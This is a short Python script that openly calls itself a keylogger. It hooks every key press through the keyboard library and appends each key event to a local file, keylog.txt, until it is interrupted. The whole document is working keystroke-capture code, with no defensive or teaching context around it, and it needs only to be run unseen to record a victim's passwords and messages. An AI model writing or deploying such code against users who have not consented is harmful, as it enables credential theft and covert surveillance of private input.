import keyboard
import time

# Set the log file
log_file = "keylog.txt"

# Function to log keystrokes
def log_keystroke(event):
    with open(log_file, "a") as f:
        f.write(f"{event.event_type} {event.name}\n")

# Start the keylogger
print("Keylogger started. Press Ctrl+C to stop.")
keyboard.on_press(log_keystroke)

try:
    while True:
        time.sleep(0.1)
except KeyboardInterrupt:
    print("Keylogger stopped.")